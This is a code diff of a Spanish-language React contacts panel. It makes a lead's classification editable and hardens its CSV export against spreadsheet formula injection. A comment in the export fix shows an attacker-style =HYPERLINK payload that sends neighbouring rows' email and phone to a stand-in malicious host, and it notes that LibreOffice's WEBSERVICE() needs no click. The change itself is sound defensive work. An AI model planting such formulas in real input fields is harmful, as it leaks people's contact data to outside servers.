@@ -179,7 +179,9 @@ function PanelCliente({
           ciudad: modo.contacto.ciudad,
           perfil: modo.contacto.perfil,
           nota: modo.contacto.nota,
-          // No se edita: el origen es de dónde entró, un hecho que ya pasó.
+          // Sí se edita, y el origen no se toca: viaja como `tipo` y el
+          // servidor lo guarda aparte. De dónde entró es un hecho que ya pasó;
+          // lo que puede estar mal es la lectura que se hizo de ese hecho.
           busca: modo.contacto.tipo,
         }
       : BORRADOR_VACIO
@@ -263,7 +265,17 @@ function PanelCliente({
       ciudad: borrador.ciudad,
       perfil: borrador.perfil,
       nota: borrador.nota,
-      ...(editando ? {} : { correo: borrador.correo, origen: ORIGEN_POR_TIPO[borrador.busca] }),
+      /*
+       * Al dar de alta, «qué busca» se traduce a un origen: es lo único que
+       * hay, porque esa persona no ha entrado por ningún sitio.
+       *
+       * Al corregir viaja como `tipo`, y el servidor lo guarda aparte sin
+       * tocar el origen: de dónde entró es un hecho que ya pasó, y lo que
+       * puede estar mal es la lectura que se hizo de ese hecho.
+       */
+      ...(editando
+        ? { tipo: borrador.busca }
+        : { correo: borrador.correo, origen: ORIGEN_POR_TIPO[borrador.busca] }),
     };
 
     const res = await onGuardar(cuerpo);
@@ -454,31 +466,31 @@ function PanelCliente({
               {error('perfil')}
             </label>
 
-            {!editando && (
-              <label className={css.etiquetaCampo}>
-                Qué busca
-                <select
-                  value={borrador.busca}
-                  onChange={(e) => setBorrador((b) => ({ ...b, busca: e.target.value as Tipo }))}
-                  className={css.campoCaja}
-                >
-                  {TIPOS.map((t) => (
-                    <option key={t} value={t}>
-                      {ETIQUETA_TIPO[t]}
-                    </option>
-                  ))}
-                </select>
-              </label>
-            )}
+            {/* También al corregir: una clasificación mal puesta era lo único
+                de la ficha que no había forma de arreglar, y la propia pantalla
+                mandaba a «abrir su ficha y corregirla ahí». */}
+            <label className={css.etiquetaCampo}>
+              Qué busca
+              <select
+                value={borrador.busca}
+                onChange={(e) => setBorrador((b) => ({ ...b, busca: e.target.value as Tipo }))}
+                className={css.campoCaja}
+              >
+                {TIPOS.map((t) => (
+                  <option key={t} value={t}>
+                    {ETIQUETA_TIPO[t]}
+                  </option>
+                ))}
+              </select>
+            </label>
           </div>
 
-          {!editando && (
-            <p className={css.apunte}>
-              Esto es lo que separa la lista en tres: a quien quiere una sesión no se le escribe
-              igual que a quien quiere formarse. Si no lo sabes, déjalo sin clasificar y
-              pregúntaselo.
-            </p>
-          )}
+          <p className={css.apunte}>
+            Esto es lo que separa la lista en tres: a quien quiere una sesión no se le escribe
+            igual que a quien quiere formarse. Si no lo sabes, déjalo sin clasificar y
+            pregúntaselo.
+            {editando && ' Cambiarlo aquí no toca de dónde llegó: eso se queda como está.'}
+          </p>
 
           <label className={css.etiquetaCampo}>
             Nota
@@ -690,9 +702,30 @@ export default function Contactos() {
   function exportar() {
     if (!visibles.length) return;
     const cabecera = ['Fecha', 'Nombre', 'Correo', 'Teléfono', 'Ciudad', 'A qué se dedica', 'De dónde viene', 'Estado', 'Nota'];
-    // Las comillas dobles dentro de un campo se escapan duplicándolas: sin
-    // esto, una nota con comillas parte la fila en dos al abrir el archivo.
-    const escapa = (v: string) => `"${String(v ?? '').replace(/"/g, '""')}"`;
+    /*
+     * Escapar un campo del CSV son DOS cosas, no una.
+     *
+     * La primera, las comillas dobles: se duplican, o una nota con comillas
+     * parte la fila en dos al abrir el archivo.
+     *
+     * La segunda es la que importa de verdad. Excel y LibreOffice evalúan como
+     * FÓRMULA cualquier celda que empiece por =, +, - o @, y entrecomillarla en
+     * el CSV no lo impide. El texto de estos campos —nombre, ciudad, nota,
+     * origen— lo escribe quien rellena el formulario de la portada, que es
+     * cualquiera y sin cuenta. Alguien podía poner de nombre
+     * `=HYPERLINK("https://sitio.malo/?d="&B2&C2,"Pincha aquí")`, esperar a que
+     * Sorela descargara su lista, y de un clic suyo salían el correo y el
+     * teléfono de las filas de al lado hacia un servidor de fuera. En
+     * LibreOffice, WEBSERVICE() ni siquiera necesita el clic.
+     *
+     * El apóstrofo delante lo desactiva: la hoja lo lee como texto, no lo
+     * enseña en la celda, y el dato se conserva entero.
+     */
+    const escapa = (v: string) => {
+      const texto = String(v ?? '');
+      const peligroso = /^[=+\-@\t\r]/.test(texto);
+      return `"${(peligroso ? `'${texto}` : texto).replace(/"/g, '""')}"`;
+    };
     const filas = visibles.map((c) =>
       [c.creado ?? '', c.nombre, c.correo, c.whatsapp, c.ciudad, c.perfil, c.origen, c.estado, c.nota]
         .map(escapa)
